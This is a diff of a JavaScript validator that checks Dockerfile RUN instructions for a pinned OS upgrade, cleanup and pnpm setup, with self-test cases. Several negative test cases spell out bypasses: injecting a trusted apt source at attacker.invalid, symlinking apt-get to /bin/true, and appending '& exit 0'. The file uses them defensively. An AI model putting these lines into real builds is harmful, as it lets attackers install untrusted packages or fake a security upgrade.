@@ -19,6 +19,11 @@ const PINNED_OS_STEPS = [
   "apt-get -y --no-install-recommends upgrade",
   "apt-get install -y --no-install-recommends ca-certificates=20250419 curl=8.14.1-2+deb13u5 libssl3t64=3.5.7-1~deb13u2 openssl=3.5.7-1~deb13u2 openssl-provider-legacy=3.5.7-1~deb13u2",
 ];
+const PINNED_OS_CLEANUP = "rm -rf /var/lib/apt/lists/* /etc/apt/sources.list";
+const PANEL_PACKAGE_MANAGER_STEPS = [
+  "corepack enable",
+  "corepack prepare pnpm@11.17.0 --activate",
+];
 const SEMVER_NUMERIC_IDENTIFIER = "(?:0|[1-9][0-9]*)";
 const SEMVER_PRERELEASE_IDENTIFIER =
   "(?:0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)";
@@ -95,6 +100,11 @@ function hasPinnedOsUpgrade(source) {
     const literalSteps = shell.replace(/^RUN\s+/i, "").split(/\s*&&\s*/)
       .map((step) => step.trim().replace(/\s+/g, " "));
     if (!PINNED_OS_STEPS.every((step, index) => literalSteps[index] === step)) return false;
+    const suffix = literalSteps.slice(PINNED_OS_STEPS.length);
+    if (suffix[0] !== PINNED_OS_CLEANUP || !(
+      suffix.length === 1 || (suffix.length === 3 &&
+        PANEL_PACKAGE_MANAGER_STEPS.every((step, index) => suffix[index + 1] === step))
+    )) return false;
     let quote = null;
     let commands = "";
     for (let i = 0; i < shell.length; i++) {
@@ -358,10 +368,12 @@ function selfTest() {
     throw new Error("container hardening self-test classified a normal workflow as Kubernetes");
   }
   const slash = String.fromCharCode(92);
-  const canonicalUpgrade = `RUN ${PINNED_OS_STEPS.join(" && ")}`;
+  const canonicalSteps = [...PINNED_OS_STEPS, PINNED_OS_CLEANUP];
+  const canonicalUpgrade = `RUN ${canonicalSteps.join(" && ")}`;
   for (const source of [
     canonicalUpgrade,
-    `RUN ${PINNED_OS_STEPS.join(` ${slash}\n && `)} && true`,
+    `RUN ${canonicalSteps.join(` ${slash}\n && `)}`,
+    `${canonicalUpgrade} && ${PANEL_PACKAGE_MANAGER_STEPS.join(" && ")}`,
   ]) {
     if (!hasPinnedOsUpgrade(source)) throw new Error("missing real OS upgrade instruction");
   }
@@ -370,6 +382,8 @@ function selfTest() {
     canonicalUpgrade.replace(PINNED_OS_STEPS[1], "printf '%s\\n' 'deb [trusted=yes] http://attacker.invalid trixie main' > /etc/apt/sources.list"),
     canonicalUpgrade.replace(`${PINNED_OS_STEPS[2]} && `, ""),
     `${canonicalUpgrade} & exit 0`,
+    `${canonicalUpgrade} && apt-get update && apt-get reinstall curl=8.14.1-2+deb13u5`,
+    `${canonicalUpgrade} && printf '%s' 'deb [trusted=yes] http://attacker.invalid trixie main' > /etc/apt/sources.list`,
     canonicalUpgrade.replace(" upgrade &&", " upgrade# & exit 0 &&"),
     `RUN ln -sf /bin/true /usr/bin/apt-get\n${canonicalUpgrade}`,
     `USER root\n${canonicalUpgrade}`,
